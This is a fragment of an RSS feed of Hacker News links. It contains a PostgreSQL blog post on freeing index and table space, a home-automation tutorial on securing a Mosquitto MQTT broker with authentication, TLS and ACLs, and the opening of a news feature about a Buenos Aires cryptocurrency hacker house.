            <guid isPermaLink="false">hacker-news-small-sites-25989195</guid>
            <pubDate>Mon, 01 Feb 2021 14:59:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An unexpected find that freed 20GB of unused index space in PostgreSQL]]>
            </title>
            <description>
<![CDATA[
Score 364 | Comments 76 (<a href="https://news.ycombinator.com/item?id=25988871">thread link</a>) | @haki
<br/>
February 1, 2021 | https://hakibenita.com/postgresql-unused-index-size | <a href="https://web.archive.org/web/*/https://hakibenita.com/postgresql-unused-index-size">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-progress-indicator="">
        <hr>
<p>Every few months we get an alert from our database monitoring to warn us that we are about to run out of space. Usually we just provision more storage and forget about it, but this time we were under quarantine, and the system in question was under less load than usual. We thought this is a good opportunity to do some cleanups that would otherwise be much more challenging.</p>
<p>To start from the end, <strong>we ended up freeing more than 70GB of un-optimized and un-utilized space</strong> without dropping a single index or deleting any data!</p>
<p>Using conventional technics such as rebuilding indexes and tables we cleared up a lot of space, but then <strong>one surprising find helped us clear an additional ~20GB of unused indexed values!</strong></p>
<p>This is what the free storage chart of one of our databases looked like in the process:</p>
<figure><img alt="Free space over time (higher means more free space)" src="https://hakibenita.com/images/00-postgresql-unused-index-size.png"><figcaption>Free space over time (higher means more free space)</figcaption>
</figure>
<details open="">
    <summary>Table of Contents</summary>

</details>
<hr>
<h2 id="the-usual-suspects"><a href="#the-usual-suspects">The Usual Suspects</a></h2>
<p>Provisioning storage is something we do from time to time, but before we throw money at the problem we like to make sure we make good use of the storage we already have. To do that, we start with the usual suspects.</p>
<h3 id="unused-indexes"><a href="#unused-indexes">Unused Indexes</a></h3>
<p>Unused indexes are double-edged swords; you create them to make things faster, but they end up taking space and slow inserts and updates. Unused indexes are the first thing we always check when we need to clear up storage.</p>
<p>To find unused indexes we use the following query:</p>
<div><pre><span></span><span>SELECT</span>
    <span>relname</span><span>,</span>
    <span>indexrelname</span><span>,</span>
    <span>idx_scan</span><span>,</span>
    <span>idx_tup_read</span><span>,</span>
    <span>idx_tup_fetch</span><span>,</span>
    <span>pg_size_pretty</span><span>(</span><span>pg_relation_size</span><span>(</span><span>indexrelname</span><span>::</span><span>regclass</span><span>))</span> <span>as</span> <span>size</span>
<span>FROM</span>
    <span>pg_stat_all_indexes</span>
<span>WHERE</span>
    <span>schemaname</span> <span>=</span> <span>'public'</span>
    <span>AND</span> <span>indexrelname</span> <span>NOT</span> <span>LIKE</span> <span>'pg_toast_%'</span>
<span>    <span>AND</span> <span>idx_scan</span> <span>=</span> <span>0</span>
</span><span>    <span>AND</span> <span>idx_tup_read</span> <span>=</span> <span>0</span>
</span><span>    <span>AND</span> <span>idx_tup_fetch</span> <span>=</span> <span>0</span>
</span><span>ORDER</span> <span>BY</span>
    <span>pg_relation_size</span><span>(</span><span>indexrelname</span><span>::</span><span>regclass</span><span>)</span> <span>DESC</span><span>;</span>
</pre></div>


<p>The query is looking for <strong>indexes that were not scanned or fetched</strong> since the last time the statistics were reset.</p>
<p>Some indexes may seem like they were not used but they were in-fact used:</p>
<ul>
<li>
<p><a href="https://www.postgresql.org/docs/current/monitoring-stats.html#MONITORING-PG-STAT-ALL-INDEXES-VIEW" rel="noopener">The documentation</a> lists a few scenarios when this is possible. For example, when the optimizer uses meta data from the index, but not the index itself.</p>
</li>
<li>
<p>Indexes used to enforce unique or primary key constraints for tables that were not updated in a while. The indexes will look like they were not used, but it doesn't mean we can dispose of them.</p>
</li>
</ul>
<p>The find the unused indexes you can actually drop, you usually have to go over the list one by one and make a decision. This can be time consuming in the first couple of times, but after you get rid of most unused indexes it becomes easier.</p>
<p>It's also a good idea to <strong>reset the statistics counters from time to time</strong>, usually right after you finished inspecting the list. PostgreSQL provides a few <a href="https://www.postgresql.org/docs/current/monitoring-stats.html#MONITORING-STATS-FUNCS-TABLE" rel="noopener">functions to reset statistics</a> at different levels. When we find an index we suspect is not being used, or when we add new indexes in place of old ones, we usually reset the counters for the table and wait for a while:</p>
<div><pre><span></span><span>-- Find table oid by name</span>
<span>SELECT</span> <span>oid</span> <span>FROM</span> <span>pg_class</span> <span>c</span> <span>WHERE</span> <span>relname</span> <span>=</span> <span>'table_name'</span><span>;</span>
<span>-- Reset counts for all indexes of table</span>
<span>SELECT</span> <span>pg_stat_reset_single_table_counters</span><span>(</span><span>14662536</span><span>);</span>
</pre></div>


<p>We do this every once in a while, so in our case there were no unused indexes to drop.</p>
<h3 id="index-and-table-bloat"><a href="#index-and-table-bloat">Index and Table Bloat</a></h3>
<p>The next suspect is bloat. When you update rows in a table, PostgreSQL marks the tuple as dead and adds the updated tuple in the next available space. This process creates what's called "bloat", which can cause tables to consume more space than they really need. Bloat also affects indexes, so to free up space, bloat is a good place to look.</p>
<p>Estimating bloat in tables and indexes is apparently not a simple task. Lucky for us, some good people on the world wide web already <a href="https://wiki.postgresql.org/wiki/Show_database_bloat" rel="noopener">did the hard work</a> and wrote queries to estimate <a href="https://github.com/ioguix/pgsql-bloat-estimation/blob/master/table/table_bloat.sql" rel="noopener">table bloat</a> and <a href="https://github.com/ioguix/pgsql-bloat-estimation/blob/master/btree/btree_bloat.sql" rel="noopener">index bloat</a>. After running these queries you will most likely find <em>some</em> bloat, so the next thing to do it clear up that space.</p>
<h4 id="clearing-bloat-in-indexes"><a href="#clearing-bloat-in-indexes">Clearing Bloat in Indexes</a></h4>
<p>To clear bloat in an index, you need to rebuild it. There are several ways to rebuild an index:</p>
<ol>
<li>
<p><strong>Re-create the index</strong>: If you re-create the index, it will be built in an optimal way.</p>
</li>
<li>
<p><strong>Rebuild the index</strong>: Instead of dropping and creating the index yourself, PostgreSQL provides a way to re-build an existing index in-place using the <a href="https://www.postgresql.org/docs/current/sql-reindex.html" rel="noopener"><code>REINDEX</code></a> command:</p>
</li>
</ol>
<div><pre><span></span><span>REINDEX</span> <span>INDEX</span> <span>index_name</span><span>;</span>
</pre></div>


<ol>
<li><strong>Rebuild the index concurrently</strong>: The previous methods will obtain a lock on the table and prevent it from being changed while the operation is in progress, which is usually unacceptable. To rebuild the index without locking it for updates, you can <a href="https://www.postgresql.org/docs/current/sql-reindex.html#SQL-REINDEX-CONCURRENTLY" rel="noopener">rebuilt the index concurrently</a>:</li>
</ol>
<div><pre><span></span><span>REINDEX</span> <span>INDEX</span> <span>CONCURRENTLY</span> <span>index_name</span><span>;</span>
</pre></div>


<p>When using <code>REINDEX CONCURRENTLY</code>, PostgreSQL creates a new index with a name suffixed with <code>_ccnew</code>, and syncs any changes made to the table in the meantime. When the rebuild is done, it will switch the old index with the new index, and drop the old one.</p>
<figure>
<figcaption>Clearing bloat in Indexes</figcaption>
</figure>
<p>If for some reason you had to stop the rebuild in the middle, the new index will not be dropped. Instead, it will be left in an invalid state and consume space. To identify invalid indexes that were created during <code>REINDEX</code>, we use the following query:</p>
<div><pre><span></span><span>-- Identify invalid indexes that were created during index rebuild</span>
<span>SELECT</span>
    <span>c</span><span>.</span><span>relname</span> <span>as</span> <span>index_name</span><span>,</span>
    <span>pg_size_pretty</span><span>(</span><span>pg_relation_size</span><span>(</span><span>c</span><span>.</span><span>oid</span><span>))</span>
<span>FROM</span>
    <span>pg_index</span> <span>i</span>
    <span>JOIN</span> <span>pg_class</span> <span>c</span> <span>ON</span> <span>i</span><span>.</span><span>indexrelid</span> <span>=</span> <span>c</span><span>.</span><span>oid</span>
<span>WHERE</span>
    <span>-- New index built using REINDEX CONCURRENTLY</span>
    <span>c</span><span>.</span><span>relname</span> <span>LIKE</span>  <span>'%_ccnew'</span>
    <span>-- In INVALID state</span>
    <span>AND</span> <span>NOT</span> <span>indisvalid</span>
<span>LIMIT</span> <span>10</span><span>;</span>
</pre></div>


<p>Once the rebuild process is no longer active, it should be safe to drop any remaining invalid indexes.</p>
<h4 id="activating-b-tree-index-deduplication"><a href="#activating-b-tree-index-deduplication">Activating B-Tree Index Deduplication</a></h4>
<p>PostgreSQL 13 introduced a new efficient way of storing duplicate values in B-Tree indexes called <a href="https://www.postgresql.org/docs/current/btree-implementation.html#BTREE-DEDUPLICATION" rel="noopener">"B-Tree Deduplication"</a>.</p>
<p>For each indexed value, a B-Tree index will hold in its leaf both the value and a pointer to the row (TID). The larger the indexed values, the larger the index. Up until PostgreSQL 12, when the index contained many duplicate values, all of these duplicate values would be stored in the index leaves. This is not very efficient and can take up a lot of space.</p>
<figure>
<figcaption>B-Tree Index Deduplication</figcaption>
</figure>
<p>Starting at PostgreSQL 13, when B-Tree deduplication is activated, duplicate values are only stored once. This can make a huge impact on the size of indexes with many duplicate values.</p>
<p>In PostgreSQL 13 index deduplication in enabled by default, unless you deactivate it:</p>
<div><pre><span></span><span>-- Activating de-deduplication for a B-Tree index, this is the default:</span>
<span>CREATE</span> <span>INDEX</span> <span>index_name</span> <span>ON</span> <span>table_name</span><span>(</span><span>column_name</span><span>)</span> <span>WITH</span> <span>(</span><span>deduplicate_items</span> <span>=</span> <span>ON</span><span>)</span>
</pre></div>


<p>If you are migrating from PostgreSQL versions prior to 13, you need to rebuild the indexes using the <code>REINDEX</code> command in order to get the full benefits of index de-deduplication.</p>
<p>To illustrate the effect of B-Tree deduplication on the size of the index, create a table with a unique column and a non unique column, and populate it with 1M rows. On each column create two B-Tree indexes, one with deduplication enabled and another with deduplication disabled:</p>
<div><pre><span></span><span>db</span><span>=#</span> <span>CREATE</span> <span>test_btree_dedup</span> <span>(</span><span>n_unique</span> <span>serial</span><span>,</span> <span>n_not_unique</span> <span>integer</span><span>);</span>
<span>CREATE</span> <span>TABLE</span>

<span>db</span><span>=#</span> <span>INSERT</span> <span>INTO</span> <span>test_btree_dedup</span> <span>(</span><span>n_not_unique</span><span>)</span>
<span>SELECT</span> <span>(</span><span>random</span><span>()</span> <span>*</span> <span>100</span><span>)::</span><span>int</span> <span>FROM</span> <span>generate_series</span><span>(</span><span>1</span><span>,</span> <span>1000000</span><span>);</span>
<span>INSERT</span> <span>0</span> <span>1000000</span>

<span>db</span><span>=#</span> <span>CREATE</span> <span>INDEX</span> <span>ix1</span> <span>ON</span> <span>test_btree_dedup</span> <span>(</span><span>n_unique</span><span>)</span>     <span>WITH</span> <span>(</span><span>deduplicate_items</span> <span>=</span> <span>OFF</span><span>);</span>
<span>CREATE</span> <span>INDEX</span>

<span>db</span><span>=#</span> <span>CREATE</span> <span>INDEX</span> <span>ix2</span> <span>ON</span> <span>test_btree_dedup</span> <span>(</span><span>n_unique</span><span>)</span>     <span>WITH</span> <span>(</span><span>deduplicate_items</span> <span>=</span> <span>ON</span><span>);</span>
<span>CREATE</span> <span>INDEX</span>

<span>db</span><span>=#</span> <span>CREATE</span> <span>INDEX</span> <span>ix3</span> <span>ON</span> <span>test_btree_dedup</span> <span>(</span><span>n_not_unique</span><span>)</span> <span>WITH</span> <span>(</span><span>deduplicate_items</span> <span>=</span> <span>OFF</span><span>);</span>
<span>CREATE</span> <span>INDEX</span>

<span>db</span><span>=#</span> <span>CREATE</span> <span>INDEX</span> <span>ix4</span> <span>ON</span> <span>test_btree_dedup</span> <span>(</span><span>n_not_unique</span><span>)</span> <span>WITH</span> <span>(</span><span>deduplicate_items</span> <span>=</span> <span>ON</span><span>);</span>
<span>CREATE</span> <span>INDEX</span>
</pre></div>


<p>Next, compare the sizes of the four indexes:</p>
<table>
<thead>
<tr>
<th>Column</th>
<th>Deduplication</th>
<th>Size</th>
</tr>
</thead>
<tbody>
<tr>
<td>Not unique</td>
<td>Yes</td>
<td>6840 kB</td>
</tr>
<tr>
<td>Not unique</td>
<td>No</td>
<td>21 MB</td>
</tr>
<tr>
<td>Unique</td>
<td>Yes</td>
<td>21 MB</td>
</tr>
<tr>
<td>Unique</td>
<td>No</td>
<td>21 MB</td>
</tr>
</tbody>
</table>
<p>As expected, deduplication had no effect on the unique index, but it had a significant effect on the index that had many duplicate values.</p>
<p>Unfortunately for us, PostgreSQL 13 was still fresh at the time, and our cloud provider did not have support for it yet, so we were unable to use deduplication to clear space.</p>
<h4 id="clearing-bloat-in-tables"><a href="#clearing-bloat-in-tables">Clearing Bloat in Tables</a></h4>
<p>Just like in indexes, tables can also contain dead tuples that cause bloat and fragmentation. However, unlike indexes that contain data from an associated table, a table can not just simply be re-created. To re-create a table you would have to create a new table, migrate the data over while keeping it synced with new data, create all the indexes, constraints and any referential constraints in other tables. Only after all of this is done, you can switch the old table with the new one.</p>
<figure>
<figcaption>Clearing bloat in Tables</figcaption>
</figure>
<p>There are several ways to rebuild a table and reduce bloat:</p>
<ol>
<li>
<p><strong>Re-create the table</strong>: Using this method as described above often requires a lot of development, especially if the table is actively being used as it's being rebuilt.</p>
</li>
<li>
<p><strong>Vacuum the table</strong>: PostgreSQL provides a way to reclaim space occupied by bloat and dead tuples in a table using the <a href="https://www.postgresql.org/docs/current/sql-vacuum.html" rel="noopener"><code>VACUUM FULL</code> command</a>. Vacuum full requires a lock on the table, and is not an ideal solution for tables that need to be available while being vacuumed:</p>
</li>
</ol>
<div><pre><span></span><span>-- Will lock the table</span>
<span>VACUUM</span> <span>FULL</span> <span>table_name</span><span>;</span>
</pre></div>


<p>The two options above require either a significant effort, or some down time.</p>
<h4 id="using-pg_repack"><a href="#using-pg_repack">Using pg_repack</a></h4>
<p>Both built-in options for rebuilding tables are not ideal unless you can afford downtime. One popular solution for rebuilding tables and indexes without downtime is the <a href="https://reorg.github.io/pg_repack/" rel="noopener">pg_repack extension</a>.</p>
<p>Being a popular extension, <code>pg_repack</code> is likely available from your package manager or already installed by your cloud provider. To use <code>pg_repack</code>, you first need to create the extension:</p>
<div><pre><span></span><span>CREATE</span> <span>EXTENSION</span> <span>pg_repack</span><span>;</span>
</pre></div>


<p>To "repack" a table along with its indexes, issue the following command from the console:</p>
<div><pre><span></span><span>$</span> pg_repack -k --table table_name db_name
</pre></div>


<p>To rebuild a table with no downtime, the extension creates a new table, loads the data from the original table into it while keeping it …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hakibenita.com/postgresql-unused-index-size">https://hakibenita.com/postgresql-unused-index-size</a></em></p>]]>
            </description>
            <link>https://hakibenita.com/postgresql-unused-index-size</link>
            <guid isPermaLink="false">hacker-news-small-sites-25988871</guid>
            <pubDate>Mon, 01 Feb 2021 14:17:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure your MQTT server with authentication and encryption]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25988196">thread link</a>) | @juriansluiman
<br/>
February 1, 2021 | https://jurian.slui.mn/posts/smqttt-or-secure-mqtt-over-traefik/ | <a href="https://web.archive.org/web/*/https://jurian.slui.mn/posts/smqttt-or-secure-mqtt-over-traefik/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">


<article itemscope="" itemtype="http://schema.org/BlogPosting" id="content">
    <header>
        
          <time datetime="" pubdate="" itemprop="datePublished" content="2021-01-31T00:00:00Z" title="2021-01-31T00:00:00Z">January 2021</time>
    </header>

    <section>
      <p>The last days I have been experimenting in different ways how I can secure a
MQTT setup for my home automation. There’s an increasing use of IoT here at my
home and most of the applications communicate over MQTT. You simply cannot
control every device and how it gathers information. To prevent eavesdropping,
it’s time to secure MQTT.</p>
<p>This post is written with the <a href="https://www.troyhunt.com/iot-unravelled-part-3-security/">Troy Hunt IoT series</a>
in mind. Of course, you should patch your devices and put them in a
separate VLAN. However, if you have an MQTT security system and an MQTT light
bulb, did you consider the light bulb had access to the security system via MQTT?
Or did you consider IoT devices that are inside the same VLAN, but don’t use
MQTT themselves, could sniff all (security) messages communicated over your
message broker? It all boils down to the principles of <em>zero trust</em>.</p>
<p>For my home automation I am an avid <a href="https://www.home-assistant.io/">Home Assistant</a>
user. Since a long time I have a Home Assistant setup which controls a variety
of lights, switches and appliances. When I started introducing MQTT to my
setup, I used it without TLS and without authentication. Over time more
applications communicate over MQTT and I was worrying about two things:</p>
<ol>
<li>Untrusted devices could find and connect to the MQTT server without any effort;</li>
<li>Every message in every topic could be listened for anonymously.</li>
</ol>
<p>That’s why I set three goals to tighten things up:</p>
<ol>
<li>Every MQTT client must authenticate via unique usernames/passwords. Every
client gets separate credentials so there’s no reuse of passwords anywhere.</li>
<li>Enable TLS encryption for communication. The MQTT protocol (including
authentication) is plain text, meaning username and password could be sniffed if
no encryption is used.</li>
<li>Use Access Control to prevent devices reading/writing topics they should have
no interest in. If a trusted (authenticated) client sniffs into topics for other
applications, they must be blocked.</li>
</ol>

<p>The message broker I personally use is Mosquitto, as it’s lightweight and
extremely easy to use. Out of the box, it does allow anonymous connections and
no users are registered, so you need to take care of both.</p>
<p>In your <code>mosquitto.conf</code> file, make sure you have those two lines present and
make sure the mosquitto.passwd file exists (just update the path of the password
file based on your installation):</p>
<pre><code>allow_anonymous false
password_file &lt;path/to/mosquitto&gt;/mosquitto.passwd
</code></pre>
<p>Then supply Mosquitto with the credentials you want to add:</p>
<pre><code>mosquitto_passwd &lt;path/to/mosquitto&gt;/mosquitto.passwd &lt;username&gt;
</code></pre>
<p>Again, replace the path &amp; your preferred username and complete the prompt with
the password.</p>
<p>My installation resides inside docker, so in my case, the configuration files
are located at <code>/mosquitto/config/</code> and I add all my clients in bulk (via Ansible)
using the following command (<code>mqtt</code> is the name of my container)</p>
<pre><code>docker exec mqtt mosquitto_passwd -b /mosquitto/config/mosquitto.passwd &lt;user&gt; &lt;password&gt;
docker exec mqtt kill -SIGHUP 1
</code></pre>
<p>The <code>SIGHUP</code> signal is used in Mosquitto to
<a href="https://mosquitto.org/man/mosquitto-8.html#idm296">reload the configuration</a>
without restarting Mosquitto (which otherwise will probably loose some messages
along the way).</p>
<p><strong>Well done: You completed the first part of your goal securing MQTT!</strong></p>

<p>My favourite reverse proxy for production apps and home installation is <a href="https://traefik.io/">Traefik</a>.
It just integrates flawless with the tools I prefer: a dockerized setup and
automated certification renewal via Let’s Encrypt. And it’s so lightweight you
have little overhead for hosts like a Raspberry Pi.</p>
<p>All of my frontend web applications are routed via Traefik’s HTTP(S) proxy. The
fun thing is it also supports TCP and UDP traffic (which I also utilize in my
failover <a href="https://jurian.slui.mn/posts/openvpn-with-traefik-2.2/">TCP+UDP setup for OpenVPN</a>).</p>
<p>MQTT is plain TCP traffic and Traefik is able to create a TLS tunnel for TCP
traffic, so this is a fairly straightforward thing to configure. To understand
the label configuration below, make sure you read the
<a href="https://doc.traefik.io/traefik/routing/providers/docker/">Traefik documentation</a>.</p>
<pre><code>labels:
  - traefik.enable=true
  
  - traefik.tcp.routers.mqtt.rule=HostSNI(`mqtt.example.com`)
  - traefik.tcp.routers.mqtt.entrypoints=mqtt
  - traefik.tcp.routers.mqtt.tls=true
  - traefik.tcp.routers.mqtt.service=mqtt
  
  - traefik.tcp.services.mqtt.loadBalancer.server.port=1883
</code></pre>
<p>Traefik usually connects to a container’s port if there’s only one port exposed.
To be explicit I define a <code>mqtt</code> service in this case, loadbalancing the only port
in the mosquitto container. I make this explicit because the default
(unencrypted) MQTT port is 1883 and the default TLS encrypted port is 8883. If you
ever read back the configuration you should be able to trace things back.</p>
<p>Next, the docker container uses an entrypoint called <code>mqtt</code> defined in the
static configuration. Most Traefik setups use at least a <code>web</code> and <code>websecure</code>
entrypoint, I added <code>mqtt</code> at port <code>8333</code>. This creates a setup where the
docker container itself exposes an (unencrypted) port 1883 towards Traefik, this
container is inaccessible from the outside. Traefik creates an accessible
entrypoint, which will be encrypted, at port 8883. This technique is called
<em>SSL Termination</em>.</p>
<pre><code>[entryPoints]
  [entryPoints.web]
    address = ":80"
  [entryPoints.websecure]
    address = ":443"
  [entryPoints.mqtt]
    address = ":8883"
</code></pre>
<p>Finally, the rule label in the docker container gives a URL to use (like
<code>mqtt.example.com</code>) and with  <code>tls=true</code> you tell Traefik to <a href="https://doc.traefik.io/traefik/https/overview/">handle it as a
TLS connection</a>.</p>
<p><strong>This is great: You are more than halfway through securing MQTT!</strong></p>

<p>Access control in an MQTT server is the final step in securing your messaging
system for IoT. Access control defines access on a per-user basis, so above
steps for authentication and encryption are required to go further down the
security lane. Initiating access control is a principle of a whitelist, anything
<em>not</em> specified means there is <em>no access</em>. You only need to state which clients
have access to which topics, anything else is excluded.</p>
<p>Like the password file, the ACL file is referenced in the mosquitto.conf:</p>
<pre><code>acl_file &lt;path/to/mosquitto&gt;/acl
</code></pre>
<p>Next, you need to fill your ACL file. Jaimyn Mayer has an <a href="https://jaimyn.com.au/mqtt-use-acls-multiple-user-accounts/">excellent tutorial
for composing an ACL file</a>
with the usage of Home Assistant in mind so I won’t elaborate too much on this.</p>
<p>The basic format of the file consists of sections per user, where every topic
is listed to grant read and/or write access. Because of the nested structure of
MQTT topics, you can use wildcards to group topics at a higher level.</p>
<p>From Jaimyn’s example, using Home Assistant, Sonoff (WiFi powered) lights and
light sensors:</p>
<pre><code># Give Home Assitant full access to everything
user homeassist
topic readwrite #

# Allow the sonoffs to read/write to cmnd/# and stat/#
user sonoffswitch
topic readwrite cmnd/#
topic readwrite stat/#

# Allows the light sensor to read/write to the sensor topics
user lightsense
topic cmnd/sensor/#
topic stat/sensor/#
</code></pre>
<p>Tip: if you don’t know which topics are used by your devices, send Mosquitto
the <code>SIGUSR2</code> signal and it outputs a hierarchy of topics:</p>
<pre><code>kill -SIGUSER2 &lt;pid-of-mosquitto&gt;
</code></pre>
<p>In my docker setup this translates to (the output is send to stdout, so you need
to check the container logs):</p>
<pre><code>docker exec mqtt kill -SIGUSR2 1
docker logs mqtt
</code></pre>
<p>Again, when finished composing your ACL file, make sure to reload Mosquitto:</p>
<pre><code>// For normal installation
kill -SIGHUP &lt;pid-of-mosquitto&gt;

// For docker installation
docker exec mqtt kill -SIGHUP 1
</code></pre>
<p><strong>You are awesome! You completed your goal in securing your MQTT message broker!</strong></p>

<p>This ended up as a much longer post than anticipated. I was reluctant to get
going with this setup but it ended up pretty nice. The overhead (and delay in
message delivery) with TLS encryption in comparison with unencrypted MQTT is
unnoticable for me. In addition, it gives me a much safer feeling
compartimentising all the variety of IoT devices. I simply don’t trust all the
‘things’, especially the cheap stuff from far abroad. Now I know that stuff just
can’t sniff around the communication of other devices.</p>
<h2 id="client-tls-capabilities">Client TLS capabilities</h2>
<p>Just to make one thing clear if you go down this road, it may seem obvious but
encrypting MQTT traffic means every client must connect over TLS only. Switching
over to Traefik means you go over the configuration of every MQTT client (lights,
switches, cameras and so on) to enable a security flag in their respective
settings. Otherwise you end up only <em>pretending</em> being a security endboss.</p>
    </section>

    
</article>

  </div></div>]]>
            </description>
            <link>https://jurian.slui.mn/posts/smqttt-or-secure-mqtt-over-traefik/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25988196</guid>
            <pubDate>Mon, 01 Feb 2021 12:54:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The house that Bitcoin built]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25988070">thread link</a>) | @donohoe
<br/>
February 1, 2021 | https://restofworld.org/2021/rise-and-fall-of-the-house-of-bitcoin/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/rise-and-fall-of-the-house-of-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p><span>A</span> small alleyway just a few blocks from the bustling Avenida Santa Fe, Pasaje Voltaire gives the impression that it’s keeping a secret. It carries the aura of the bygone era when bohemian<strong> </strong>artists and intellectuals dominated Palermo, long before it became one of the most fashionable barrios in Buenos Aires. A block over are bars where it’s rare to hear Spanish and common to overpay for drinks. This 100-meter long passageway, however, offers no such attractions. A tourist wouldn’t think twice about walking past it, nor would a local who lives in the area. With its cobblestones and squat houses, Pasaje Voltaire is a bastion of residential silence within the lively neighborhood. It’s completely inconspicuous, save for a two-story edifice dotted with clouded windows that offer no glimpses into what’s happening inside.</p>



<p>Until recently, the building was home to a rotating cast of recent engineering graduates. Here, in Jorge Luis Borges’s former neighborhood, they chased their own kind of dream, one they believed would change the world: cryptocurrency. When they weren’t founding companies, they hosted all-night hackathons, threw elaborate parties, and welcomed friends and allies for deep talks on the nature of the social contract and the inherent value of legal tender.</p>



<p>On the right-hand side<strong> </strong>of the<strong> </strong>façade is the only remaining trace of their presence. It’s a campy illustration of a samurai Darth Vader with an owl on his shoulder. The signature below it reads “Dilucious,” the nom de plume of an artist who used to live in the building. His real name is Agustín, and he’s one of the few people willing to speak to the media about his years in the building, which is known as Voltaire House.</p>



<p>In 2015, Agustín took a sabbatical from work with the aim of reinventing himself as an artist. He had studied engineering at the Buenos Aires Institute of Technology, or ITBA, and was making good money as a developer for an Argentine telecommunications company, but he felt trapped in corporate culture. As luck would have it, he heard about some ITBA alums who had transformed a building into a “crazy hacker haven” for cryptocurrency projects. The founders were on the same spiritual journey as Agustín. After a meeting and a short deliberation, the members of Voltaire House invited Agustín to be their artist-in-residence.</p>



<p>This was before “Bitcoin” became a familiar term and crypto bros began to be stereotyped as overnight millionaires. For the coder community of Argentina at that time, cryptocurrency meant something more serious — a way to create new forms of social interaction and to upend broken economic and political systems. Ever since a coder calling himself Satoshi introduced Bitcoin in a 2008 white paper, the prospect of a decentralized, peer-to-peer monetary system had become synonymous with a potential new world: one controlled not by banks or governmental institutions but by anyone with access to a computer.</p>



<p>This vision was particularly potent in Argentina. The hackers of Voltaire House had grown up amid the turbulence of the 1990s and 2000s — an era of the country’s history defined by corrupt political administration and economic collapse, precipitated by the central government. After the country defaulted on more than $100 billion of debt in 2001, the Argentine peso began a two-decade devaluation, going from 1:1 with the U.S. dollar to 85:1 today. Argentines grew accustomed to their paychecks being devalued the instant the money landed in their bank accounts. There was no access to a stable alternative, either, as U.S. dollars were either banned or severely restricted. Many resorted to buying black-market U.S. dollars, known as “blue dollars,” which often sold for more than twice the official exchange rate.</p>



<p>Cryptocurrency offered a means of circumventing the volatility of the local economy, and the members of Voltaire House were early adopters. They believed that Bitcoin would enable them to build a future that didn’t depend on decaying institutions. Two decades later, with the value of the peso plummeting and Bitcoin trading in Argentina soaring to historic highs, this kind of thinking has emerged again.<strong> </strong>Blockchain evangelists have long touted its revolutionary power to disrupt global economic models and supplant central authorities. While this seems unlikely in countries with stable monetary institutions like the United States, Argentina is in certain respects an ideal test case. Ultimately, however, Voltaire House offered a very different lesson about the cryptocurrency’s transformative power.<strong>&nbsp;</strong></p>



<p>The mainstays of Voltaire House — about 15 people, mostly men who knew one another from ITBA — believed transparency and decentralization could fix their broken country. In pursuit of this, over a roughly three-year period, they hosted daily lunches, fell into heated discussions about theoretical physics and social science, and once invited a hacker who had broken into the servers of the Buenos Aires subway system to come meet with them. All conversations inevitably came back to basic questions of economics and society: What is money? And who should control it? They didn’t just talk: They built what would become some of Argentina’s most successful blockchain companies, including Decentraland, Muun, and OpenZeppelin,<strong> </strong>which facilitated the exchange of tens of millions of real-world dollars.</p>



<p>“The house itself was a project,” said Sacha Lifszyc, a visitor during those years. For the few young programmers in Buenos Aires lucky enough to be extended an invitation, going to Voltaire House was like entering a refuge where everything contained the potential for innovation. From the outset, its members were famously secretive: There’s scarcely any digital footprint of the talks and parties they hosted, and Voltaire’s events and public discussions were promoted <em>boca en boca</em>. Aside from a <a href="https://medium.com/decentraland/an-inside-look-into-how-crypto-projects-are-made-bffae4b20eae">Medium article in 2017</a>, Voltaire House avoided media coverage. All of its key members dodged interview requests for this story, making it clear through intermediaries that they weren’t interested, and strongly discouraged others from speaking. “This ethos of being anonymous really resonates with them,” said Agustín Ferreira, a coder who was friends with many in the house. “Like being Satoshi, you know?”</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/GettyImages-483584244-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/GettyImages-483584244-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/GettyImages-483584244-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/GettyImages-483584244-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/GettyImages-483584244-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/GettyImages-483584244-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/GettyImages-483584244-2800x1867.jpg 2800w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="Voltaire House was located in Buenos Aires's Palermo neighborhood, known for its bustling nightlife and touristy offerings.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Victor J. Blue/Bloomberg/Getty Images</span>
			</figcaption>
		</figure>


<hr>



<p>Manuel Aráoz founded Voltaire House in 2014 after graduating from ITBA with a degree in computer science and joining a U.S.-based crypto wallet, BitPay, as one of its first employees. Thanks to the success of the e-commerce giant MercadoLibre, Argentina had acquired a reputation as a hotbed for highly trained software developers. Domestic and foreign tech companies employed <a href="https://www.progressivepolicy.org/wp-content/uploads/2016/05/2016.05-DiIonno_Mandel_Argentina_The-Road-to-the-App-Economy.pdf">tens of thousands</a> of coders in the country, <a href="https://www.quora.com/What-is-the-annual-salary-in-USD-of-a-senior-software-web-application-developer-in-Argentina-or-Buenos-Aires">often paying them</a> four or five times the national minimum wage. (Agustín described coding as the second-most lucrative job in the country after football.) Yet while computer engineering was an acceptable career, cryptocurrency was still new, as were most of the companies working with it. When Aráoz joined BitPay, it<strong> </strong>had about $2.5 million in funding. Today, it has raised a total of $72.5 million.</p>



